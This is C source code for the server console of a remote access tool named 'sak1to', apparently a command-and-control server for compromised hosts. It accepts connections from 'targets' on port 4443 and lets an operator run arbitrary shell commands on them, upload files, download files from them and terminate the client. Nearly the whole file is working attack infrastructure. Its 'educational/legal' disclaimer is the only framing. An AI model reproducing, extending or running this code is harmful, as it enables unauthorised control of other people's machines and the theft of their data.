/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include <stdio.h> 
#include <netdb.h>
#include <stdlib.h> 
#include <unistd.h>
#include <string.h> 
#include <arpa/inet.h> 
#include <pthread.h>
#include <stdint.h>
#include "sakito_tools.h"

// Mutex lock for pthread race condition checks.
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
// Variable for mutex condition.
pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;
 
typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	int sock;

} Conn;
 
typedef struct {
	// Server socket for accepting connections.
	int listen_socket;

	// Flag for race condition checks.
	int THRD_FLAG;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t alloc;

	// Amount of memory used.
	size_t size;

} Conn_map;
 
// Typedef for function pointer.
typedef int (*func)(char*, size_t, int);

void terminate_server(int listen_socket, char* error) {
	close(listen_socket);
	perror(error);
	
	exit(1);
}
 
// Function to create socket.
int create_socket() {
	// Create the server socket object.
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) {
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}
 
// Function to bind socket to specified port.
void bind_socket(int listen_socket, const int port) {
	// Create sockaddr_in structure.
	struct sockaddr_in serv_addr;
	serv_addr.sin_family = AF_INET; 

	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
	serv_addr.sin_port = htons(port); 

	// Bind ip address and port to listen_socket
	if (bind(listen_socket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) 
		terminate_server(listen_socket, "Socket bind failed.\n");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "Placing socket into listening state failed.\n");
}
 
// Thread to recursively accept connections.
void* accept_conns(void* param) {
	Conn_map* conns = param;
	conns->alloc = MEM_CHUNK;
 
	conns->size = 0;
	conns->clients = malloc(conns->alloc * sizeof(Conn));
 
	conns->listen_socket = create_socket();
	bind_socket(conns->listen_socket, 4443);
 
	while (1) {
		// Wait for a connection.
		struct sockaddr_in client;
		int client_sz = sizeof(client);
 
		// Client socket object.
		int client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &client_sz); 
		if (client_socket < 0)
			terminate_server(conns->listen_socket, "Error accepting client connection.\n");
 
		// Client's remote name and client's ingress port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };
 
		if (conns->size == conns->alloc)
			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));

		if (getnameinfo((struct sockaddr*)&client, client_sz, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// If delete_conn() is executing: wait for it to finish modifying conns->clients to-
		// prevent race conditions from occurring.
		pthread_mutex_lock(&lock);

		// When THRD_FLAG evaluates to 0: execution has ended.
		while (conns->THRD_FLAG)
			pthread_cond_wait(&consum, &lock);

		// Set race condition flag to communicate with delete_conn().
		conns->THRD_FLAG = 1;
	
		// Add hostname string and client_socket file descriptor to conns->clients structure.
		conns->clients[conns->size].host = host;
		conns->clients[conns->size].sock = client_socket;

		conns->size++;

		// Unlock/release mutex..
		pthread_mutex_unlock(&lock);
	
		// Execution is finished so allow delete_conn() to continue.
		conns->THRD_FLAG = 0;
	}
}
 
// Function to list/print all available connections to stdout.
void list_connections(const Conn_map* conns) {
	printf("\n\n---------------------------\n");
	printf("---  C0NNECTED TARGETS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");

	if (conns->size) {
		for (size_t i = 0; i < conns->size; i++)
			printf("%s: %lu\n", conns->clients[i].host, i);
		printf("\n\n");
	}
	else {
		printf("No connected targets available.\n\n\n");
	}
}

// Function to upload file to target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, int client_socket) {
	// '3' is the command code for uploading a file via the client.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (write(client_socket, &buf[7], cmd_len) < 1)
		return -1;
 
	// Open file.
	FILE* fd = fopen(&buf[8], "rb");
	uint32_t bytes = 0, f_size = 0;
 
	// If the file exists:
	if (fd) {
		// Get file size.
		fseek(fd, 0L, SEEK_END);
		f_size = ftell(fd);
 
		// Serialize f_size.
		bytes = htonl(f_size);
		fseek(fd, 0L, SEEK_SET);
	}
 
	// Send the serialized file size bytes.
	if (write(client_socket, (char*)&bytes, sizeof(bytes)) < 1)
		return -1;
 
	// Initialize i_result as true.
	int i_result = 1;
 
	if (f_size) {
		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
		int bytes_read;
		while (!feof(fd) && i_result > 0) {
			if (bytes_read = fread(buf, 1, BUFLEN, fd))
				// Send file's bytes chunk to remote server.
				i_result = write(client_socket, buf, bytes_read);
			else
				break;
		}
		// Close the file.
		fclose(fd);
	}
 
	return i_result;
}
 
// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
	// '4' is the command code for downloading a file via the client.
	buf[9] = '4';
	
	// Send command code + filename to be parsed.
	if (write(client_socket, &buf[9], cmd_len) < 1)
		return -1;
 
	// Open the file.
	FILE* fd = fopen(&buf[10], "wb");
 
	// Receive serialized file size uint32_t bytes.
	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
		return -1;
 
	// Deserialize file size bytes.
	uint32_t f_size = ntohl_conv(&*(buf));
	int i_result = 1;
 
	// Varaible to keep track of downloaded data.
	long int total = 0;
 
	// Receive all file bytes/chunks and write to file until total == file size.
	while (total != f_size && i_result > 0) {
		i_result = read(client_socket, buf, BUFLEN);

		// Write bytes to file.
		fwrite(buf, 1, i_result, fd);
		total += i_result;
	}
 
	// Close the file.
	fclose(fd);
 
	return i_result;
}
 
// Function send change directory command to client.
int client_cd(char* const buf, const size_t cmd_len, int client_socket) {
	// '1' is the command code for changing directory.
	buf[3] = '1';
	
	// Send command code + directory string to be parsed.
	if (write(client_socket, &buf[3], cmd_len) < 1)
		return -1;
 
	return 1;
}
 
// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, int client_socket) {
	// '2' is the command code for terminating/killing the process on the client.
	write(client_socket, "2", cmd_len);
 
	return 0;
}
 
// Function to send command to client.
int send_cmd(char* const buf, const size_t cmd_len, int client_socket) {
	// Send command to server.
	if (write(client_socket, buf, cmd_len) < 1)
		return -1;

	// Receive serialized output size uint32_t bytes.
	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
		return -1;
 
	// Deserialize output size bytes.
	uint32_t s_size = ntohl_conv(&*(buf));

	// Initialize i_result to true.
	int i_result = 1;
	
	// Receive command output stream and write output chunks to stdout.
	do {
		if ((i_result = read(client_socket, buf, BUFLEN)) < 1)
			return i_result;
		fwrite(buf, 1, i_result, stdout);
	} while ((s_size -= i_result) > 0);
 
	// write a single newline to stdout for cmd line output alignment.
	fputc('\n', stdout);
 
	return i_result;
}

// Function to return function pointer based on parsed command.
const func parse_cmd(char* const buf) {
	// Array of command strings to parse stdin with.
	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };

	// Function pointer array of each c2 command.
	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file};

	// Parse stdin string and return it's corresponding function pointer.
	for (int i = 0; i < 4; i++)
		if (compare(buf, commands[i]))
			return func_array[i];

	// If no command was parsed: send/execute the command string on the client via _popen().
	return &send_cmd;
}

// Function to resize conns array/remove and close connection.
void delete_conn(Conn_map* conns, const int client_id) {
	// If accept_conns() is executing: wait for it to finish modifying conns->clients to-
	// prevent race conditions from occurring.
	pthread_mutex_lock(&lock);

	// Wait for accept_conns() to finish modifying conns->clients.
	while (conns->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);	

	// Set our thread flag to prevent a race condition from occurring with accept_conns().
	conns->THRD_FLAG = 1;

	// If the file descriptor is open: close it.
	if (conns->clients[client_id].sock)
		close(conns->clients[client_id].sock);

	// If there's more than one connection: resize the clients structure's member values.
	if (conns->size > 1) {
		int max_index = conns->size-1;
		for (size_t i = client_id; i < max_index; i++) {
			conns->clients[i].sock = conns->clients[i + 1].sock;
			conns->clients[i].host = conns->clients[i + 1].host;
		}
		conns->clients[max_index].sock = 0;
		conns->clients[max_index].host = NULL;
	}

	conns->size--;

	// Unlock/release our mutex.
	pthread_mutex_unlock(&lock);

	// Allow accept_conns() to continue.
	conns->THRD_FLAG = 0;
}

// Function to parse interactive input and send to specified client.
void interact(Conn_map* conns, char* const buf, const int client_id) {
	int client_socket = conns->clients[client_id].sock;
	char* client_host = conns->clients[client_id].host;
 
	// Set i_result to true.
	int i_result = 1;
 
	// Receive and parse input/send commands to client.
	while (i_result > 0) {
		printf("%s // ", client_host);
	
		// Set all bytes in buffer to zero.
		memset(buf, '\0', BUFLEN);
 
		size_t cmd_len = get_line(buf);
		char* cmd = &buf[1];

		if (cmd_len > 1) {
			if (compare(cmd, "background")) {
				return;
			}
			else {
				// Parse and execute command function.
				const func target_func = parse_cmd(cmd);
				i_result = target_func(buf, cmd_len, client_socket);
			}
		}
	}
 
	// If client disconnected/exit command is parsed: delete the connection.
	delete_conn(conns, client_id);
	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
}
 
// Function to execute command.
void exec_cmd(char* const buf) {
	// Call Popen to execute command(s) and read the process' output.
	FILE* fpipe = popen(buf, "r");
	fseek(fpipe, 0, SEEK_END);
 
	size_t cmd_len = ftell(fpipe);
	fseek(fpipe, 0, SEEK_SET);
 
	// Stream/write command output to stdout.
	int rb = 0;
	do {
		rb = fread(buf, 1, BUFLEN, fpipe);
		fwrite(buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Write single newline character to stdout for cmd line output alignment.
	fputc('\n', stdout);
 
	// Close the pipe.
	pclose(fpipe);
}
 
// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	// Instantiate a Conn_map structure.
	Conn_map conns;

	// Set out race condition flag to false.
	conns.THRD_FLAG = 0;

	// Create our pthread object.
	pthread_t acp_thread;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&acp_thread, NULL, accept_conns, &conns);
 
	// Saktio console loop. 
	while (1) {
		printf("sak1to-console // ");
		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
		char buf[BUFLEN + 1] = { 0 };
 
		size_t cmd_len = get_line(buf);
		char* cmd = &buf[1];
 
		if (cmd_len > 1) {
			if (compare(cmd, "exit")) {
				// Quit accepting connections.
				pthread_cancel(acp_thread);
				// if there's any connections close them before exiting.
				if (conns.size) {
					for (size_t i = 0; i < conns.size; i++)
						close(conns.clients[i].sock);
					// Free allocated memory.
					free(conns.clients);
				}
				close(conns.listen_socket);
				break;
			}
			else if (compare(cmd, "cd ")) {
				// List all connections.
				chdir(&cmd[3]);
			}
			else if (compare(cmd, "list")) {
				// List all connections.
				list_connections(&conns);
			}
			else if (compare(cmd, "interact ")) {
				// Interact with client.
				int client_id;
				client_id = atoi(&cmd[9]);
				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
					printf("Invalid client identifier.\n");
				else
					interact(&conns, buf, client_id);
			}
			else {
				// Execute command on host system.
				exec_cmd(cmd);
			}
		}
	}
	return 0;
}
